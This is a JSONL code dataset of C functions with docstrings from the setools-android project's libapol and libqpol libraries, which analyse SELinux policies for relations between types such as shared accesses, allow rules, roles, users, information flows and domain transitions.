{"docstring": "/**\n * Find accesses, both similar and dissimilar, between both typeA and\n * typeB.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param do_similar 1 if to calculate similar accesses, 0 to skip.\n * @param do_dissimilar 1 if to calculate dissimilar accesses, 0 to skip.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_accesses(const apol_policy_t * p,\n\t\t\t\t\tconst qpol_type_t * typeA,\n\t\t\t\t\tconst qpol_type_t * typeB, int do_similar, int do_dissimilar,\n\t\t\t\t\tapol_types_relation_result_t * r)", "code": "{\n\tapol_vector_t *accessesA = NULL, *accessesB = NULL;\n\tapol_types_relation_access_t *a, *b;\n\tsize_t i, j;\n\tint retval = -1;\n\n\tif ((accessesA = apol_vector_create(apol_types_relation_access_free)) == NULL\n\t    || (accessesB = apol_vector_create(apol_types_relation_access_free)) == NULL) {\n\t\tERR(p, \"%s\", strerror(errno));\n\t\tgoto cleanup;\n\t}\n\tif (apol_types_relation_create_access_pools(p, typeA, typeB, accessesA, accessesB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tapol_vector_sort(accessesA, apol_types_relation_access_compfunc2, NULL);\n\tapol_vector_sort(accessesB, apol_types_relation_access_compfunc2, NULL);\n\n\tif (do_similar) {\n\t\tif ((r->simA = apol_vector_create(apol_types_relation_access_free)) == NULL\n\t\t    || (r->simB = apol_vector_create(apol_types_relation_access_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tif (do_dissimilar) {\n\t\tif ((r->disA = apol_vector_create(apol_types_relation_access_free)) == NULL\n\t\t    || (r->disB = apol_vector_create(apol_types_relation_access_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\t/* Step through each element for each access sorted list.  If\n\t * their types match and if do_similiar, then append the union\n\t * of the access rules to the results.  If their types do not\n\t * match and if do_similar then add to results.\n\t */\n\tfor (i = j = 0; i < apol_vector_get_size(accessesA) && j < apol_vector_get_size(accessesB);) {\n\t\ta = (apol_types_relation_access_t *) apol_vector_get_element(accessesA, i);\n\t\tb = (apol_types_relation_access_t *) apol_vector_get_element(accessesB, j);\n\t\tif (a->type == b->type) {\n\t\t\tif (do_similar &&\n\t\t\t    (apol_types_relation_access_append(p, a, r->simA) < 0 ||\n\t\t\t     apol_types_relation_access_append(p, b, r->simB) < 0)) {\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t\ti++;\n\t\t\tj++;\n\t\t} else {\n\t\t\tif (a->type < b->type) {\n\t\t\t\tif (do_dissimilar && apol_types_relation_access_append(p, a, r->disA) < 0) {\n\t\t\t\t\tgoto cleanup;\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t} else {\n\t\t\t\tif (do_dissimilar && apol_types_relation_access_append(p, b, r->disB) < 0) {\n\t\t\t\t\tgoto cleanup;\n\t\t\t\t}\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t}\n\tfor (; do_dissimilar && i < apol_vector_get_size(accessesA); i++) {\n\t\ta = (apol_types_relation_access_t *) apol_vector_get_element(accessesA, i);\n\t\tif (apol_types_relation_access_append(p, a, r->disA) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tfor (; do_dissimilar && j < apol_vector_get_size(accessesB); j++) {\n\t\tb = (apol_types_relation_access_t *) apol_vector_get_element(accessesB, j);\n\t\tif (apol_types_relation_access_append(p, b, r->disB) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&accessesA);\n\tapol_vector_destroy(&accessesB);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find all allow rules that involve both types.  Create a vector of\n * those rules (as represented as qpol_avrule_t pointers relative to\n * the provided policy) and set r->allows to that vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_allows(const apol_policy_t * p, const qpol_type_t * typeA, const qpol_type_t * typeB,\n\t\t\t\t      apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_avrule_query_t *aq = NULL;\n\tapol_vector_t *v = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((aq = apol_avrule_query_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_avrule_query_set_rules(p, aq, QPOL_RULE_ALLOW) < 0 ||\n\t    apol_avrule_query_set_source(p, aq, nameA, 1) < 0 ||\n\t    apol_avrule_query_set_target(p, aq, nameB, 1) < 0 || apol_avrule_get_by_query(p, aq, &r->allows) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (apol_avrule_query_set_source(p, aq, nameB, 1) < 0 ||\n\t    apol_avrule_query_set_target(p, aq, nameA, 1) < 0 || apol_avrule_get_by_query(p, aq, &v) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (apol_vector_cat(r->allows, v) < 0) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_avrule_query_destroy(&aq);\n\tapol_vector_destroy(&v);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Given a vector of apol_infoflow_result_t objects, deep copy to the\n * results vector those infoflow results whose target type matches\n * target_name (or any of target_name's attributes or aliases).\n *\n * @param p Policy within which to lookup types.\n * @param v Vector of existing apol_infoflow_result_t.\n * @param target_name Target type name.\n * @param results Vector to which clone matching infoflow results.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_clone_infoflow(const apol_policy_t * p, const apol_vector_t * v, const char *target_name,\n\t\t\t\t\t      apol_vector_t * results)", "code": "{\n\tapol_vector_t *candidate_types = NULL;\n\tconst qpol_type_t *target;\n\tapol_infoflow_result_t *res, *new_res;\n\tsize_t i, j;\n\tint retval = -1;\n\tif ((candidate_types = apol_query_create_candidate_type_list(p, target_name, 0, 1, APOL_QUERY_SYMBOL_IS_BOTH)) == NULL) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(v); i++) {\n\t\tres = (apol_infoflow_result_t *) apol_vector_get_element(v, i);\n\t\ttarget = apol_infoflow_result_get_end_type(res);\n\t\tif (apol_vector_get_index(candidate_types, target, NULL, NULL, &j) == 0) {\n\t\t\tif ((new_res = infoflow_result_create_from_infoflow_result(res)) == NULL ||\n\t\t\t    apol_vector_append(results, new_res) < 0) {\n\t\t\t\tinfoflow_result_free(new_res);\n\t\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t}\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&candidate_types);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Comparison function for a vector of apol_types_relation_access_t\n * pointers.  Returns 0 if the access type at a matches the type b.\n *\n * @param a Pointer to an existing apol_types_relation_access_t.\n * @param b Pointer to a qpol_type_t.\n * @param data Unused.\n *\n * @return 0 if a's type matchs b, non-zero if not.\n */\n", "func_signal": "static int apol_types_relation_access_compfunc(const void *a, const void *b, void *data __attribute__ ((unused)))", "code": "{\n\tapol_types_relation_access_t *access = (apol_types_relation_access_t *) a;\n\tqpol_type_t *t = (qpol_type_t *) b;\n\treturn (int)((char *)access->type - (char *)t);\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/***************************** syn_terule functions ****************************/\n", "func_signal": "int qpol_syn_terule_get_rule_type(const qpol_policy_t * policy, const qpol_syn_terule_t * rule, uint32_t * rule_type)", "code": "{\n\tavrule_t *internal_rule = NULL;\n\n\tif (rule_type)\n\t\t*rule_type = 0;\n\n\tif (!policy || !rule || !rule_type) {\n\t\tERR(policy, \"%s\", strerror(EINVAL));\n\t\terrno = EINVAL;\n\t\treturn STATUS_ERR;\n\t}\n\n\tinternal_rule = ((struct qpol_syn_rule *)rule)->rule;\n\n\t*rule_type = internal_rule->specified;\n\n\treturn STATUS_SUCCESS;\n}", "path": "jni\\libqpol\\syn_rule_query.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find the roles whose allowed types include both typeA and typeB.\n * Create a vector of those roles (as represented as qpol_role_t\n * pointers relative to the provided policy) and set r->roles to that\n * vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_common_roles(const apol_policy_t * p,\n\t\t\t\t\t    const qpol_type_t * typeA, const qpol_type_t * typeB, apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_role_query_t *rq = NULL;\n\tapol_vector_t *vA = NULL, *vB = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((rq = apol_role_query_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_role_query_set_type(p, rq, nameA) < 0 ||\n\t    apol_role_get_by_query(p, rq, &vA) < 0 ||\n\t    apol_role_query_set_type(p, rq, nameB) < 0 || apol_role_get_by_query(p, rq, &vB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((r->roles = apol_vector_create_from_intersection(vA, vB, NULL, NULL)) == NULL) {\n\t\tERR(p, \"%s\", strerror(errno));\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_role_query_destroy(&rq);\n\tapol_vector_destroy(&vA);\n\tapol_vector_destroy(&vB);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find all direct information flows between the two types.  Create a\n * vector of apol_infoflow_result_t and set r->dirflows to that vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_directflow(const apol_policy_t * p,\n\t\t\t\t\t  const qpol_type_t * typeA, const qpol_type_t * typeB, apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_infoflow_analysis_t *ia = NULL;\n\tapol_vector_t *v = NULL;\n\tapol_infoflow_graph_t *g = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((r->dirflows = apol_vector_create(infoflow_result_free)) == NULL || (ia = apol_infoflow_analysis_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_infoflow_analysis_set_mode(p, ia, APOL_INFOFLOW_MODE_DIRECT) < 0 ||\n\t    apol_infoflow_analysis_set_dir(p, ia, APOL_INFOFLOW_EITHER) < 0 ||\n\t    apol_infoflow_analysis_set_type(p, ia, nameA) < 0 || apol_infoflow_analysis_do(p, ia, &v, &g) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (apol_types_relation_clone_infoflow(p, v, nameB, r->dirflows) < 0) {\n\t\tgoto cleanup;\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&v);\n\tapol_infoflow_analysis_destroy(&ia);\n\tapol_infoflow_graph_destroy(&g);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Allocate a new apol_types_relation_access_t and append it to a\n * vector.  The new access node's type will be set to a's type.  The\n * rules will be a clone of a's rules.\n *\n * @param p Policy from which rule originated.\n * @param a Access node to duplicate.\n * @param access Vector of apol_types_relation_access_t to append.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_access_append(const apol_policy_t * p, const apol_types_relation_access_t * a,\n\t\t\t\t\t     apol_vector_t * access)", "code": "{\n\tapol_types_relation_access_t *new_a;\n\tint retval = -1;\n\tif ((new_a = calloc(1, sizeof(*new_a))) == NULL\n\t    || (new_a->rules = apol_vector_create_from_vector(a->rules, NULL, NULL, NULL)) == NULL) {\n\t\tERR(p, \"%s\", strerror(errno));\n\t\tgoto cleanup;\n\t}\n\tnew_a->type = a->type;\n\tif (apol_vector_append(access, new_a) < 0) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tretval = 0;\n      cleanup:\n\tif (retval != 0) {\n\t\tapol_types_relation_access_free(new_a);\n\t}\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find the users whose roles have as their allowed types both typeA\n * and typeB.  Create a vector of those users (as represented as\n * qpol_user_t pointers relative to the provided policy) and set\n * r->users to that vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_common_users(const apol_policy_t * p,\n\t\t\t\t\t    const qpol_type_t * typeA, const qpol_type_t * typeB, apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_role_query_t *rq = NULL;\n\tapol_vector_t *vA = NULL, *vB = NULL;\n\tqpol_iterator_t *iter = NULL, *riter = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((rq = apol_role_query_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_role_query_set_type(p, rq, nameA) < 0 ||\n\t    apol_role_get_by_query(p, rq, &vA) < 0 ||\n\t    apol_role_query_set_type(p, rq, nameB) < 0 || apol_role_get_by_query(p, rq, &vB) < 0) {\n\t\tgoto cleanup;\n\t}\n\n\tif ((r->users = apol_vector_create(NULL)) == NULL) {\n\t\tERR(p, \"%s\", strerror(errno));\n\t\tgoto cleanup;\n\t}\n\tif (qpol_policy_get_user_iter(p->p, &iter) < 0) {\n\t\tgoto cleanup;\n\t}\n\tfor (; !qpol_iterator_end(iter); qpol_iterator_next(iter)) {\n\t\tqpol_user_t *user;\n\t\tsize_t i;\n\t\tint inA = 0, inB = 0;\n\t\tif (qpol_iterator_get_item(iter, (void **)&user) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif (qpol_user_get_role_iter(p->p, user, &riter) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tfor (; (!inA || !inB) && !qpol_iterator_end(riter); qpol_iterator_next(riter)) {\n\t\t\tqpol_role_t *role;\n\t\t\tif (qpol_iterator_get_item(riter, (void **)&role) < 0) {\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t\tif (!inA && apol_vector_get_index(vA, role, NULL, NULL, &i) == 0) {\n\t\t\t\tinA = 1;\n\t\t\t}\n\t\t\tif (!inB && apol_vector_get_index(vB, role, NULL, NULL, &i) == 0) {\n\t\t\t\tinB = 1;\n\t\t\t}\n\t\t}\n\t\tqpol_iterator_destroy(&riter);\n\t\tif (inA && inB && apol_vector_append(r->users, user) < 0) {\n\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_role_query_destroy(&rq);\n\tapol_vector_destroy(&vA);\n\tapol_vector_destroy(&vB);\n\tqpol_iterator_destroy(&iter);\n\tqpol_iterator_destroy(&riter);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/******************** public functions below ********************/\n", "func_signal": "int apol_types_relation_analysis_do(apol_policy_t * p, const apol_types_relation_analysis_t * tr, apol_types_relation_result_t ** r)", "code": "{\n\tconst qpol_type_t *typeA, *typeB;\n\tunsigned char isattrA, isattrB;\n\tunsigned int do_similar_access, do_dissimilar_access;\n\tunsigned int do_transAB, do_transBA;\n\tunsigned int do_domainAB, do_domainBA;\n\tint retval = -1;\n\t*r = NULL;\n\n\tif (tr->typeA == NULL || tr->typeB == NULL) {\n\t\tERR(p, \"%s\", strerror(EINVAL));\n\t\tgoto cleanup;\n\t}\n\tif (apol_query_get_type(p, tr->typeA, &typeA) < 0 ||\n\t    apol_query_get_type(p, tr->typeB, &typeB) < 0 ||\n\t    qpol_type_get_isattr(p->p, typeA, &isattrA) < 0 || qpol_type_get_isattr(p->p, typeB, &isattrB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (isattrA) {\n\t\tERR(p, \"Symbol %s is an attribute.\", tr->typeA);\n\t\tgoto cleanup;\n\t}\n\tif (isattrB) {\n\t\tERR(p, \"Symbol %s is an attribute.\", tr->typeB);\n\t\tgoto cleanup;\n\t}\n\tif ((*r = calloc(1, sizeof(**r))) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_COMMON_ATTRIBS) && apol_types_relation_common_attribs(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_COMMON_ROLES) && apol_types_relation_common_roles(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_COMMON_USERS) && apol_types_relation_common_users(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tdo_similar_access = tr->analyses & APOL_TYPES_RELATION_SIMILAR_ACCESS;\n\tdo_dissimilar_access = tr->analyses & APOL_TYPES_RELATION_DISSIMILAR_ACCESS;\n\tif ((do_similar_access || do_dissimilar_access) &&\n\t    apol_types_relation_accesses(p, typeA, typeB, do_similar_access, do_dissimilar_access, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_ALLOW_RULES) && apol_types_relation_allows(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_TYPE_RULES) && apol_types_relation_types(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((tr->analyses & APOL_TYPES_RELATION_DIRECT_FLOW) && apol_types_relation_directflow(p, typeA, typeB, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tdo_transAB = tr->analyses & APOL_TYPES_RELATION_TRANS_FLOW_AB;\n\tdo_transBA = tr->analyses & APOL_TYPES_RELATION_TRANS_FLOW_BA;\n\tif ((do_transAB || do_transBA) && apol_types_relation_transflow(p, typeA, typeB, do_transAB, do_transBA, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\tdo_domainAB = tr->analyses & APOL_TYPES_RELATION_DOMAIN_TRANS_AB;\n\tdo_domainBA = tr->analyses & APOL_TYPES_RELATION_DOMAIN_TRANS_BA;\n\tif ((do_domainAB || do_domainBA) && apol_types_relation_domain(p, typeA, typeB, do_domainAB, do_domainBA, *r) < 0) {\n\t\tgoto cleanup;\n\t}\n\n\tretval = 0;\n      cleanup:\n\tif (retval != 0) {\n\t\tapol_types_relation_result_destroy(r);\n\t}\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find all type transition / type change rules that involve both\n * types.  Create a vector of those rules (as represented as\n * qpol_terule_t pointers relative to the provided policy) and set\n * r->types to that vector.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_types(const apol_policy_t * p, const qpol_type_t * typeA, const qpol_type_t * typeB,\n\t\t\t\t     apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_terule_query_t *tq = NULL;\n\tapol_vector_t *v = NULL, *candidate_types = NULL;\n\tconst qpol_terule_t *rule;\n\tconst qpol_type_t *target, *default_type;\n\tsize_t i, j;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((r->types = apol_vector_create(NULL)) == NULL || (tq = apol_terule_query_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_terule_query_set_rules(p, tq, QPOL_RULE_TYPE_TRANS | QPOL_RULE_TYPE_CHANGE) < 0 ||\n\t    apol_terule_query_set_source(p, tq, nameA, 1) < 0 ||\n\t    apol_terule_get_by_query(p, tq, &v) < 0 ||\n\t    (candidate_types = apol_query_create_candidate_type_list(p, nameB, 0, 1, APOL_QUERY_SYMBOL_IS_BOTH)) == NULL) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(v); i++) {\n\t\trule = (qpol_terule_t *) apol_vector_get_element(v, i);\n\t\tif (qpol_terule_get_target_type(p->p, rule, &target) < 0 ||\n\t\t    qpol_terule_get_default_type(p->p, rule, &default_type) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((apol_vector_get_index(candidate_types, target, NULL, NULL, &j) == 0 ||\n\t\t     apol_vector_get_index(candidate_types, default_type, NULL, NULL, &j) == 0) &&\n\t\t    apol_vector_append(r->types, (void *)rule) < 0) {\n\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\tapol_vector_destroy(&v);\n\tapol_vector_destroy(&candidate_types);\n\tif (apol_terule_query_set_source(p, tq, nameB, 1) < 0 ||\n\t    apol_terule_get_by_query(p, tq, &v) < 0 ||\n\t    (candidate_types = apol_query_create_candidate_type_list(p, nameA, 0, 1, APOL_QUERY_SYMBOL_IS_BOTH)) == NULL) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(v); i++) {\n\t\trule = (qpol_terule_t *) apol_vector_get_element(v, i);\n\t\tif (qpol_terule_get_target_type(p->p, rule, &target) < 0 ||\n\t\t    qpol_terule_get_default_type(p->p, rule, &default_type) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((apol_vector_get_index(candidate_types, target, NULL, NULL, &j) == 0 ||\n\t\t     apol_vector_get_index(candidate_types, default_type, NULL, NULL, &j) == 0) &&\n\t\t    apol_vector_append(r->types, (void *)rule) < 0) {\n\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_terule_query_destroy(&tq);\n\tapol_vector_destroy(&v);\n\tapol_vector_destroy(&candidate_types);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Find domain transitions between the two types.\n *\n * @param p Policy containing types' information.\n * @param typeA First type to check.\n * @param typeB Other type to check.\n * @param do_domainAB 1 if to find transitions from type A to B, 0 to skip.\n * @param do_domainBA 1 if to find transitions from type B to A, 0 to skip.\n * @param r Result structure to fill.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_domain(apol_policy_t * p,\n\t\t\t\t      const qpol_type_t * typeA,\n\t\t\t\t      const qpol_type_t * typeB,\n\t\t\t\t      unsigned int do_domainsAB, unsigned int do_domainsBA, apol_types_relation_result_t * r)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_domain_trans_analysis_t *dta = NULL;\n\tapol_vector_t *v = NULL;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((dta = apol_domain_trans_analysis_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_policy_build_domain_trans_table(p) < 0 ||\n\t    apol_domain_trans_analysis_set_direction(p, dta, APOL_DOMAIN_TRANS_DIRECTION_FORWARD) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif (do_domainsAB) {\n\t\tapol_policy_reset_domain_trans_table(p);\n\t\tif (apol_domain_trans_analysis_set_start_type(p, dta, nameA) < 0 || apol_domain_trans_analysis_do(p, dta, &v) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((r->domsAB = apol_vector_create(domain_trans_result_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif (apol_types_relation_clone_domaintrans(p, v, nameB, r->domsAB) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tif (do_domainsBA) {\n\t\tapol_vector_destroy(&v);\n\t\tapol_policy_reset_domain_trans_table(p);\n\t\tif (apol_domain_trans_analysis_set_start_type(p, dta, nameB) < 0 || apol_domain_trans_analysis_do(p, dta, &v) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif ((r->domsBA = apol_vector_create(domain_trans_result_free)) == NULL) {\n\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\tgoto cleanup;\n\t\t}\n\t\tif (apol_types_relation_clone_domaintrans(p, v, nameA, r->domsBA) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&v);\n\tapol_domain_trans_analysis_destroy(&dta);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * The following builds separate databases to hold rules for typeA and\n * typeB respectively.  The database holds a vector of pointers to\n * apol_types_relation_access_t objects.  Then compare access lists\n * for typeA and typeB, determine common and unique access and have\n * easy access to the relevant rules.\n *\n * @param p Policy to look up av rules.\n * @param typeA First type to build access list.\n * @param typeB Other type to build access list.\n * @param accessesA Vector of apol_types_relation_access_t for typeA.\n * @param accessesB Vector of apol_types_relation_access_t for typeB.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_create_access_pools(const apol_policy_t * p,\n\t\t\t\t\t\t   const qpol_type_t * typeA,\n\t\t\t\t\t\t   const qpol_type_t * typeB, apol_vector_t * accessesA, apol_vector_t * accessesB)", "code": "{\n\tconst char *nameA, *nameB;\n\tapol_avrule_query_t *aq = NULL;\n\tapol_vector_t *vA = NULL, *vB = NULL;\n\tsize_t i;\n\tint retval = -1;\n\n\tif (qpol_type_get_name(p->p, typeA, &nameA) < 0 || qpol_type_get_name(p->p, typeB, &nameB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tif ((aq = apol_avrule_query_create()) == NULL) {\n\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\tgoto cleanup;\n\t}\n\tif (apol_avrule_query_set_rules(p, aq, QPOL_RULE_ALLOW) < 0 ||\n\t    apol_avrule_query_set_source(p, aq, nameA, 1) < 0 ||\n\t    apol_avrule_get_by_query(p, aq, &vA) < 0 ||\n\t    apol_avrule_query_set_source(p, aq, nameB, 1) < 0 || apol_avrule_get_by_query(p, aq, &vB) < 0) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(vA); i++) {\n\t\tqpol_avrule_t *r = (qpol_avrule_t *) apol_vector_get_element(vA, i);\n\t\tif (apol_types_relation_access_append_rule(p, r, accessesA) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tfor (i = 0; i < apol_vector_get_size(vB); i++) {\n\t\tqpol_avrule_t *r = (qpol_avrule_t *) apol_vector_get_element(vB, i);\n\t\tif (apol_types_relation_access_append_rule(p, r, accessesB) < 0) {\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\n\tretval = 0;\n      cleanup:\n\tapol_avrule_query_destroy(&aq);\n\tapol_vector_destroy(&vA);\n\tapol_vector_destroy(&vB);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
